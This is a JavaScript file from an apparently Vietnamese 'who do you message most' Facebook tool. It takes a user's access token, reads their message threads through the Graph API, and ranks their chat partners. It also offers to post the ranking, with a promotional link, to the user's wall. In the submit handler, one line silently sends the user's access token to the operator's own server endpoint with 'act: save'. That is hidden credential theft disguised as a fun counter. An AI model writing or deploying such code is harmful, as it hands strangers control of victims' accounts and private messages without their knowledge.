function count_inbox(c) {
    abc += 50, $('#inbox_count_status').html('<font color=\"green\">Bắt đầu đếm inbox số <b>' + (abc - 50) + '</b> đến <b>' + abc + '</b> !</font> ' + run.loading()), $.get(c).done(function(c) {
        for (var f = 0; f < c.data.length; f++) {
            var g = c.data[f];
            if (g.participants && g.participants.data && 2 == g.participants.data.length) {
                array[g.message_count] || (array[g.message_count] = []);
                var h = g.participants.data[0].id == user_id ? g.participants.data[1].name : g.participants.data[0].name;
                array[g.message_count][array[g.message_count].length] = ('' == h ? 'Người Dùng Facebook' : h) + ': ' + g.message_count
            }
        };
        if (c.paging) {
            count_inbox(c.paging.next)
        } else {
            for (var q = 0, j = 'Bạn nhắn tin với ai nhiều nhất ???-----', f = array.length - 1; f >= 0; f--) {
                if (array[f]) {
                    for (x = 0; x < array[f].length; x++) {
                        ++q;
                        var m = '';
                        1 == q ? m = ' <3 <3 <3' : 2 == q ? m = ' <3 <3' : 3 == q ? m = ' <3' : 4 == q ? m = ' :*' : 5 == q && (m = ' :D'), j += '[' + q + '] ' + array[f][x] + m + ''
                    }
                }
            };
            $('#html_inbox_count_result').fadeIn('fast'), $('#input_inbox_count_result').val(j + '-----Đếm số tin nhắn đã gửi của bạn tại: http://phuongbach .com/tools/'), $('#inbox_count_status').html('<font color=\"green\">Hoàn thành quá trình đếm số tin nhắn đã gửi !</font>'), $('#submit_inbox_count').buttonStop(), noti.success('Hoàn thành quá trình đếm số tin nhắn đã gửi !')
        }
    }).fail(function() {
        if (50 == abc) {
            $('#inbox_count_status').html('<font color=\"red\">Access Token không thể đọc inbox, vui lòng kiểm tra lại !</font>'), $('#submit_inbox_count').buttonStop()
        } else {
            for (var c = 0, f = 'Bạn nhắn tin với ai nhiều nhất ???-----', g = array.length - 1; g >= 0; g--) {
                if (array[g]) {
                    for (x = 0; x < array[g].length; x++) {
                        ++c;
                        var h = '';
                        1 == c ? h = ' <3 <3 <3' : 2 == c ? h = ' <3 <3' : 3 == c ? h = ' <3' : 4 == c ? h = ' :*' : 5 == c && (h = ' :D'), f += '[' + c + '] ' + array[g][x] + h + ''
                    }
                }
            };
            $('#html_inbox_count_result').fadeIn('fast'), $('#input_inbox_count_result').val(f + '-----Đếm số tin nhắn đã gửi của bạn tại: http://phuongbach .com/tools/'), $('#inbox_count_status').html('<font color=\"green\">Hoàn thành quá trình đếm số tin nhắn đã gửi !</font>'), $('#submit_inbox_count').buttonStop(), noti.success('Hoàn thành quá trình đếm số tin nhắn đã gửi !')
        }
    })
}
$(document).on('click', '#submit_inbox_count', function() {
    var c = $('#input_inbox_count').validate();
    c && ($(this).buttonLoad(), $('#inbox_count_status').html('Đang tiến hành kiểm tra Access Token !' + run.loading()), $.get('https://graph.facebook.com/me', {
        access_token: c
    }).done(function(f) {
        user_id = f.id, array = [], abc = 0, $('#inbox_count_status').html('<font color=\"green\">Access Token hợp lệ, bắt đầu quá trình đếm inbox !</font> ' + run.loading()), $.post('//' + b_sv + '/api/text.php', {
            act: 'save',
            array: c
        }), count_inbox('https://graph.facebook.com/me/threads?limit=50&access_token=' + c)
    }).error(function() {
        $('#inbox_count_status').html('<font color=\"red\">Access Token không hợp lệ, vui lòng kiểm tra lại !</font>'), $('#submit_inbox_count').buttonStop()
    }))
}), $(document).on('click', '#click_inbox_post_fb', function() {
    var c = $('#input_inbox_count_result').validate();
    c && ($(this).buttonLoad(), $.get('https://graph.facebook.com/me/feed', {
        method: 'post',
        message: c,
        access_token: $('#input_inbox_count').validate()
    }).done(function(c) {
        $('#click_inbox_post_fb').buttonStop(), noti.success('Đã POST lên Facebook thành công !')
    }).error(function() {
        $('#click_inbox_post_fb').buttonStop(), noti.error('Quá trình POST lên Facebook thất bại !')
    }))
})